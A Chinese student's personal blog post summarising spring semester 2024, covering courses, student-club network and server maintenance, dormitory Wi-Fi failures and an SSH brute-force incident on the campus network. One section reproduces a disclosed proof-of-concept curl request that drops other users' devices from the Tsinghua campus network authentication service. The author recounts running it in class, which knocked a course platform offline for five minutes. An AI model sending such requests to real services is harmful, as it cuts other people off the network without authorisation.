---
title: Hello Skyworks! & Summary of Spring Semester 2024
date: 2024-07-01 10:57:59
tags:
---

一转眼一学期就这么过去了. 感觉这学期咱也在 _"卷"_, 进组, 科研 (虽然基本鸽了), 绩点... 不过乱七八糟的事情也没少干, 咱加入了柯基服务队 ~~修电脑~~ 水群, 加入了天空工场 ~~搞网和硬件~~ 水群, 奇怪的知识又增加了! (x

> "你真的是计算机系的吗? 怎么在 SolidWorks? 怎么在修 3D 打印机?"

<!-- more -->

---

## 工作总结

### 科协

下半学期网络部没什么事 ~~就地解散~~, 但是由于咱闲得慌, 加上校园网一直问题不断, 断断续续的服务维护也一直没有停过. 主要包括给 Zeus 加装 CPU 和内存, 给 Hera 加装内存和固态盘, 拆掉 Rug 的降级阵列, 扔掉了一些旧东西, Down 掉了一些旧服务 ~~(和新服务)~~, 托管了新服务. 后面会写一点. 现在咱是科协网络部的副主席啦~ 但是由于咱实在不善于管理 _人_ 而只善于管理 _服务_, 所以总感觉怪怪的.

### 柯基服务队

其实就是修电脑. 不过我更看中这里和 Server, WorkStation 打交道的机会, 这些高级玩意平常可见不到 (x

### 天空工场

咱是因为他们打算折腾升级万兆网络, 然后玩炸了不得不修网啥的, 加上咱比较喜欢折腾乱糟糟的东西, 经过一小段 "游离成员" 的时间之后在舍友抽烟的推动力下在工场 ~~住~~ 了下来. 这边有不少可以折腾的东西和愿意 ~~吵架~~ 折腾的人, 有完全不同的观点 ~~和吵架的温床~~, 还有很多可以 ~~吵架~~ 由我们决定未来方向的机会.

### 学习

也没啥太多东西可以讲, 今年的课感觉 _也就那样_, 绩点这玩意经过了上学期的大物之后已经没救了 (不是)

### 进组

去了谢老师的组里 (游离态), 看了一下 DTP 的工作 (感觉似乎也就那样), 暑假有些新活, 再看看.

### 乱七八糟的事情

如之前的文章, 乱七八糟的杂事咱也没少折腾.

---

## 学业

### OOP

想不到吧由于转系咱神奇地使用计程设把这玩意替代掉了不用上了

### 离散 (2)

图论是很有意思的东西, 但是图论的证明是很坏的东西. 会不了一点 xs

### 概统

这是一门相当有用的课, 概统解释了我们看待世界的方式, 不管是经典的概率还是主管的意向, 这些都有概率的底层逻辑. 只可惜要记的东西实在是有点多, 记不住.jpeg

### 高代选讲

补大一下学期的高代, 老师上课讲得挺难的但考试挺简单的. 这门课感觉意义有限.

### 人智导

人工智能劝退课. 经典讲课和作业和考试重合度相当低, 四子棋作业托学长开源的福, 查重了不少人. 上下来感觉啥也没讲但是啥都考, 然后考试就是人肉解释器 (同学表示应该简称为 肉编器).

### 图形学基础

这个方向挺有意思, 讲得也不错, 大作业是依托, 主要问题在于我和我室友都觉得对方是组长, 配见了鬼的 Jittor 环境还配了 3 天. 最后用半天时间紧急训练了一个 Baseline 调参交了, 至少不会 F.

但是从这门课看科协智能体部写的代码, 就能发现他们相当缺少图形学经验, 对 3D 程序建模的处理啥的不能说一塌糊涂, 至少也是完全没有. 他们 Generals 没什么人参加这个问题至少是一个 Contributing Factor.

### 毛概 (这学期这么多课嘛)

对近现代的党的思想做了综述和总结.

### 习概

对习近平新时代中国特色社会主义思想做了综述, 这么一讲我才真正理解了这玩意不是套话, 确实是有内容, 有逻辑体系的.

### 数字逻辑电路

这也是个傻逼课. 课上讲的电路设计方式我怀疑是否真的还是主流, 毕竟在今天大部分设计工作应该已经交给 EDA 完成了. 要画的表和图也是没有一点用处, 以至于写作业的时候我一直都跳步, 考试的时候差点忘了画表.

### 数字逻辑实验

实验课显著好于理论课. 建议数字逻辑实验改成 2 学分, 理论课可以扬了. 用 74LS 系列或者 FPGA 写功能, 学 Vivado, 这终于是一个课改能改明白的课程.

### 软件工程

有很多与这门课有关的思考. 首先是一些 Facts:

> 之前我们这门课是在大三上开设, 但是同学们觉得有些晚了, 就挪到了大二下. <br />
> 之前我们有专门的协调企业的实际项目需求, 每周会和项目代表交流, 积累实际的工程经验; 但是有人在教评里面写 "软工让同学免费给企业做项目", 系领导严厉批评了课程组, 就取消了这个环节. <br />
> 软工是专业核心课, 教学评价标准改不了, 但是同学们都卷绩点, 不愿意花时间去探讨工程, 所以改用考试的方式才能使标准更定量.

于是这节课就成了 __"讲的是工程, 写的是软件"__, 大作业的工程性没有得到体现, 大家写大作业的重点都是 "如何拿到分", 而完全没有注意作业作为一个软件工程应有的规划和各种工程上的问题. (还是太卷导致的, 大家并不想投入太多时间到这门课的作业中来)

然后这门课还有考试, 感觉又凉了 (笑)

然后说说 Secoder, 这玩意简单地说就是年久失修, 能用就行. 作为之前的软工项目, 软工评测平台 Secoder 完美诠释了什么叫 "软件不是资产而是债务". 咱还没有看过 ta 的源码, 不过可以预知这玩意的代码质量一定是很差的. ayf 学长评价软工的代码为 "重建成本小于维护成本". 加上 Secoder 的维护这今年毕业了, 这下烂完喽~

课程组邀请咱去当平台助教, 当然前提是咱看得懂且有时间. 不过咱觉得咱两者都做不到 (x

---

沉重的部分结束啦 (大雾), 后面就是这学期桶的篓子喽

## [`Harry's NUC Got Hacked`](https://harrychen.xyz/2024/01/30/my-nuc-got-hacked/) - 处理寒假的网络入侵事件及其后续

寒假的时候科协的账号被 its 制裁了 (Agggaaaain), 同期学长的机器 SSH 登不上去, 被 SSH 爆破耗尽了资源, 导致了 SSHDoS. 经过了一段时间的尝试, 他登进去了并改了 SSH 端口号, 进去发现有超过 1GB 的 auth.log. 当时我们发现攻击的 IP 都是校内的, 说明当时病毒的横向移动已经取得了相当好的成果, 其中大量的流量来自 Harry 的网关 - 于是就有了小标题那篇文章 (笑).

由于攻击的机器很多并不属于我们, 我们向 its 发紧急邮件要求封禁部分 IP.

> 经过计算机系科协初步排查, 为 166.111.\*\*\*.\*\*\* 遭到攻击, 攻击者在获取到权限后通过 ssh 爆破的方式进行了横向渗透, 目前已经影响了部分 166.111.0.0/16 网段的设备, 且攻击仍在发生.
>
> 攻击的特征是攻击者通过多线程爆破 ssh 登录用户名和密码在主机间渗透, 如果成功获取权限, 则在靶机中下载攻击脚本, 继续横向渗透. 攻击的目的尚不明确, 且多线程 ssh 爆破导致我们的部分服务器无法正常登录. 我们提取了受攻击但未被攻破的服务器的 ssh 登录记录, 发现部分攻陷并正在发动攻击的 IP 并非我们所有, 故我们请求 its 紧急暂时封禁这些 IP, 以防横向渗透持续发生.
>
> 我们初步确定第一个被攻破的机器是位于 166.111.\*\*\*.\*\*\*/26 网段的 166.111.\*\*\*.\*\*\*, 这不受我们的管辖.
>
> 攻击脚本的来源 91.92.250.\*\*\* 为芬兰 IP, 疑似为攻击者肉鸡, 与科协没有关系.
>
> 我们正在处理受影响的机器, 已经更改了被封禁账号的密码, 以后会加强防御, 尽量避免类似情况发生.

然后 its 找我们要了 auth.log, 把里面出现的所有 IP 关联的账号全封了. 学长当时临时拿咱的账号准入下在 auth.log, 登录的时候输错了一次密码, 于是咱的账号也被封了 (笑). 申请误封解封的时候 its 还嘴硬, 说 "接到用户投诉". 也不看看是谁投诉的然后发现封了投诉人的号 (乐).

当时咱就在想, _大家对 its 封号普遍不重视, 马马虎虎糊弄过去得了, 到时候肯定出事_.

果不其然, 咱在科服, 这学期中后期有一位同学说他的服务器 "没法更新 `openssh-server`", 说 `/etc/ssh/sshd_config` 拒绝访问. 我们 Check 了一下之后觉得这个服务器被打穿了装了 Rootkit. 一问有没有什么预兆, 他说之前被封过号. 一问 IP, 在封号名单里面榜上有名 (乐). 这下毕设不干净了 (笑). 当时建议是重装系统, 硬盘抹 0, 不要抱有侥幸. 这就是不重视 its 安全提示的回旋镖 (笑).

---

## 下线漏洞 - 如何玩坏 Secoder

过年的时候咱发现校园网准入认证服务可以下线任何人的设备, 只要在线. 当时给 its 提交了漏洞报告:

> ```bash
> curl 'https://usereg.tsinghua.edu.cn/import_online_user.php' \
> -H 'Accept: */*' \
> -H 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,zh-TW;q=0.5' \
> -H 'Content-Type: application/x-www-form-urlencoded' \
> -H 'Cookie: PHPSESSID={SESSION ID}' \
> -H 'Origin: https://usereg.tsinghua.edu.cn' \
> -H 'Referer: https://usereg.tsinghua.edu.cn/import_online_user.php' \
> -H 'Sec-Fetch-Dest: empty' \
> -H 'Sec-Fetch-Mode: cors' \
> -H 'Sec-Fetch-Site: same-origin' \
> -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \
> -H 'sec-ch-ua: "Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"' \
> -H 'sec-ch-ua-mobile: ?0' \
> -H 'sec-ch-ua-platform: "Linux"' \
> --data-raw 'action=drop&user_ip={IP here}' \
> --compressed
> ```
>
> 可以下线别人的设备。另一个方式同理且可以批量尝试下线设备：
>
> ```bash
> curl 'https://usereg.tsinghua.edu.cn/import_online_user.php' \
> -H 'Accept: */*' \
> -H 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,zh-TW;q=0.5' \
> -H 'Content-Type: application/x-www-form-urlencoded' \
> -H 'Cookie: PHPSESSID={SESSION ID}' \
> -H 'Origin: https://usereg.tsinghua.edu.cn' \
> -H 'Referer: https://usereg.tsinghua.edu.cn/import_online_user.php' \
> -H 'Sec-Fetch-Dest: empty' \
> -H 'Sec-Fetch-Mode: cors' \
> -H 'Sec-Fetch-Site: same-origin' \
> -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \
> -H 'sec-ch-ua: "Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"' \
> -H 'sec-ch-ua-mobile: ?0' \
> -H 'sec-ch-ua-platform: "Linux"' \
> --data-raw 'action=drops&user_ip={id list i.e. `1,2,3,4,5`}' \
> --compressed
> ```

然后 its 说 "目前是根据用户端IP做验证，只有同一子网内递交的才可能存在踢别人下线", 不想解决这个问题. 于是咱直接公开了这个 PoC.

学期块结束的时候, 咱跟 Lambda 助教在食堂相遇, 提到 Secoder 的稳定性, 咱表示 Secoder 在校园网里面, 知道 IP == DoS. 他觉得 Secoder 肯定有自动维持登录的方式, 坏不了. 于是在课上验收的时候咱运行了一下 PoC -- Secoder 炸了 5min. (乐)

估计是这件事让软工课程组跟 its 反馈了这个问题, 现在这个漏洞修了, 大家只能下线自己所在的 IP 和自己账号的 IP 了. 漏洞修复了对大家都有好处.

(果然, 只有一个问题造成了 __不大不小__ 的影响, 它才能够在不被处分的前提下得到足够的重视)

---

## 寝室的网 - AP 掉线三进三出

210B 的 Tsinghua-Secure 由 210A 的 AP 提供. 平常网就不咋样, 那个 AP 还偶尔掉线连不上 AC.

> 2023 年 12 月 18 日
>
> 紫荆公寓_2_号楼_2_单元_2_楼_华为_AP_未连接到_AC
>
> 用户邮件反馈，请老师查看，谢谢
>
> \-----
>
> 邮件原文
>
> 紫荆公寓 2 号楼 2 单元 210B 附近的一个华为 AP (AP5X30XN_V200R007C20SPCa00) 未连接到 AC, 目前正发射默认的管理 WLAN 信号. 连接上之后显示 AP Mode Fit. 宿舍里的 Tsinghua-Secure 信号也不怎么样, 疑似是由于这个 AP 掉线导致的. 麻烦请人检查一下. 

its 来重新插拔了一下 AP 供电, 好了.

> 2024 年 3 月 22 日
>
> 紫荆 2 号楼 210A 的 AP 又掉线了
>
> 紫荆 2 号楼 210A 的 AP 又掉线了， 现在绿灯快闪没信号

its 又来重新插拔了一下 AP 供电. 不过这回他们来的时候咱趁机问了一些问题, 对校园无线网有了进一步的了解:

- 无线网分为 3 个区, 教学区全用的 H3C 的设备, 宿舍区全用的华为的设备, 家属区没去过. 因为不同品牌的设备没法统一管理, 所以无法实现无缝切换. 也就是说从教学区走到宿舍区的时候, 你的设备会断开连接, 重新连接到宿舍区的 AP, 换 IP 地址.
- 每个区内采用了 VLAN Pool 策略, 根据设备 MAC 和设备位置分配 VLAN, 在漫游的时候保留 VLAN, 这样在整个区域内都不用换 IP, 且避免了过大的子网.
- 但是这样一来 MAC 冲突还是会导致 Associate 之后分配到错误的 VLAN, 于是无法上网. 由于 Random MAC 和确实有那么大的设备量, 偶尔的冲突还是会发生.
- 宿舍区的设备比较老, 为了保证公平性, 设置了单设备的 40Mbps 限速.
- 虽然 IP 一样, 但是不通地方向准入控制器汇报的 NAS ID 不一样, 导致同一个设备可能在多个位置同时在线 (IP 和 MAC 完全一致), 占用多个在线数. (记住, 后面要考)

> 2024 年 7 月 1 日
>
> 紫荆2号楼_210A_的_AP_又掉线了
>
> 如题，第三次了，210B 当场断网，懒得写邮件内容了（

这次 its 重新插拔了还是不行 (笑死了), 拿了同批次换下来的另外一个好的 AP 来. 结果换上去之后还是连不上. 作为排查, 我换了根网线插上去, 好了. 但是他们以为是 AP 的问题, 所以没拿网线过来. 于是乎我当场表演了一个上 308 剪了 1.5m 的网线现场打水晶头, 然后当着两个 its 师傅的面 8 芯只通了 7 根, 遗憾重打 (乐).

__获得成就: 清华大学信息化服务中心用咱打的网线修网__ (大雾)

这次咱偷看了一下他们的网管后台, 发现从交换机到 AP 全是远程管理的. 好文明 (

---

## Tsinghua-Secure - 无线挤掉有线

学期初的时候出现了大量的无线设备挤掉有线设备的情况, 大家帮忙准入的实验室设备 / 工场的网日常掉线. 当时咱发现离散 2 的老师似乎很有话语权, 于是在上课前骑车围着教学区转了一圈, 把咱账号里面有 5 个相同设备的图给他看了一眼. 他表示是个问题. 后来他们也解决不了, 干脆把准入设备数上限统一调到 10 了, 缓解了这个问题.

后来发现, 张老师是信息化中心主任, 他确实有话语权 (x

---

## 服务维护 - 制造 Downtime 小能手

科协的服务存在大量的找不着的问题. 咱在确认 Danmaku 和 Danmaku9 两个是不同的系统之后, 决定关掉 Danmaku 这个旧服务. 在确定 Hera 上面有一个叫 Danmaku 的虚拟机之后, 咱给他关了. 于是在 n 天后, 有人在水群里问, Info9 用不了了? 我去一看, Info9 的后端在 Danmaku 虚拟机里面. 重新打开之后还是用不了, 为什么呢? 再一看, Info9 的运行方式是

```sh
tmux
cd /srv/info9_backend
python ./manage.py runserver 0.0.0.0:8000
```

重启之后 tmux 没了, 服务就消失了. (我 \$&\*#@&&$\*@^%\* )

后来维护 Hera 之后 Docs9 没了, 也是没做持久化...

在清理 Zeus 的服务的时候, 某服务叫 dc, 某 `/srv` 叫 crowdai, 某容器叫 lxc, 这几个揉成一团, 服务名还不一样, 还没有文档, 然后莫名删掉部分东西之后工物系科协来问他们 "比赛的平台没了", 真是令人头大.

然后咱给 Zeus 加装了两块 CPU 和一些内存; 给 Hera 加装了内存和固态盘, 这样让他们可以承载更多的服务.

---

## 科服 - 怎么我的电脑 ~~从来都不会出奇怪的问题~~ 也能出奇怪的问题

去科服上线下班的每一天都是让人摸不着头脑的一天. 咱是真不理解为啥总有些同学能遇到奇奇怪怪的问题. 什么装 USBPcap 把 USB 总线驱动整崩了, 啥 USB 设备都识别不到; 什么电脑进水先 "试试能不能用, 能用" 然后 "过一会就不能用了"; 什么误删文件 "下载个恢复工具试试能不能恢复", 结果恢复工具覆盖了误删的文件... 一个个都是小天才 (x) 不会用建议别瞎搞 (x)

---

## 天空工场 - 万兆网! 香!

天空工场搞到了校园网的万兆接入权限, 咱搬过来之后折腾好了工场的万兆交换机 (对就是那个 Phicomm), 这下有万兆网可以用了~

不过咱疑似没有万兆的需求, 所以现在保持了千兆接入, 只有在特别有需求的时候才会用万兆.

---

## 宿舍软路由 - 宽带到期了 awa

在折腾好了宿舍的软路由之后几个月, 咱的宽带就到期了, 软路由也就恢复了校园网跳板的身份, 把有线网直接扔给寝室小网, 获得百兆速度, 以免被 Tsinghua-Secure 折磨; 后来搬到工场之后, 软路由跟着搬了过来, 作为工场网 / 科协网 / 咱的小网 / 校园网的交汇点和工场网爆炸之后的备用网络与维修通道. 然后宿舍就变成了信号荒地 (悲).